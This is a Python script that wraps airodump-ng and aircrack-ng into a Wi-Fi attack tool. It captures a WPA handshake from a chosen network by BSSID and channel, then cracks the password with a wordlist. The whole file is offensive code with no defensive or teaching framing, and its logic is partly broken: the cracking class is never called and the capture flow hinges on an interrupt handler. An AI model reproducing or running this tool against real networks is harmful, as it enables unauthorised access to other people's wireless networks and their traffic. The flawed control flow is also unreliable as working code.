import subprocess
import getmac

class WordlistAttackTool:
    def __init__(self, handshake_file, wordlist_file):
        self.handshake_file = handshake_file
        self.wordlist_file = wordlist_file

    def run_wordlist_attack(self):
        """Perform wordlist attack using aircrack-ng"""
        print("Performing wordlist attack...")

        # Start wordlist attack using aircrack-ng
        cmd = ["aircrack-ng", self.handshake_file, '-w', self.wordlist_file]
        subprocess.call(cmd)

        print("Wordlist attack completed.")


class WifiScan:
    def __init__(self, adapter):
        self.adapter = adapter

    def capture_handshake(self):
        """Capture WPA handshake"""
        print("Capturing handshake")

        # Get the current MAC address
        current_mac = getmac.get_mac_address(interface=self.adapter)
        print("Current MAC address:", current_mac)

        try:
            # Start the capture process in the background
            capture_process = subprocess.Popen(['airodump-ng', self.adapter])

            # Wait for user input to stop the capture process
            input("Press Enter to stop the capture process...")

        except KeyboardInterrupt:
            channel = input("[+] Input channel of Wi-Fi network: ")
            client_bssid = input("[+] Input client BSSID: ")
            handshake_file = input("[+] Input handshake file name: ")
            subprocess.run([
                'airodump-ng',
                '--bssid', client_bssid,
                '--channel', channel,
                '--write', handshake_file,
                self.adapter
            ])

        finally:
            # Cancel the capture process if it was started
            if capture_process:
                capture_process.terminate()
                capture_process.wait()

    def run_wifi_scan(self):
        try:
            self.capture_handshake()
        except KeyboardInterrupt:
            pass


def main():
    adapter = input("[+] Input Wi-Fi adapter: ")
    tool = WifiScan(adapter)
    tool.run_wifi_scan()


if __name__ == "__main__":
    main()
